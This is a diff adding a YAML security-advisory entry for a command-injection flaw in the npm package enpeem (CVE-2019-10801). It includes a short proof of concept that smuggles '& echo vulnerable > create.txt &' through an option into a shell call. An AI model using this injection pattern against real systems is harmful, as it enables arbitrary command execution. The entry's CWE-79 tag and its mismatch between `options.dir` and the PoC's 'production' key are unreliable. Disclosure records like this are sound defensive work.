@@ -1,0 +1,40 @@
+---
+- id: snykio:npm:enpeem:559007
+  title: Command Injection
+  description: |
+    [enpeem][1] is a lightweight wrapper for accessing npm programmatically
+    (alternative to adding `npm` as a dependency)
+
+    Affected versions of this package are vulnerable to Command Injection.
+    The `options.dir` argument is provided to the `exec` function without
+    any sanitization.
+
+    ### PoC By JHU System Security Lab   {#poc-by-jhu-system-security-lab}
+
+        var root = require("enpeem");
+        var attack_code = "& echo vulnerable > create.txt &";
+        var opts = {
+          "production": attack_code
+        }
+        root.update(opts, function(){});
+
+
+
+    [1]: https://www.npmjs.com/package/enpeem
+  affected_package: enpeem
+  vulnerable_versions:
+  - "*"
+  severity: medium
+  package_manager: npm
+  cve:
+  - CVE-2019-10801
+  cwe:
+  - CWE-79
+  disclosed_date: 2020-02-28
+  created_date: 2020-02-28
+  last_modified_date: 2020-02-28
+  credit:
+  - JHU System Security Lab
+  references:
+  - https://github.com/balderdashy/enpeem/blob/master/index.js#L114
+  source_url: https://snyk.io/vuln/SNYK-JS-ENPEEM-559007
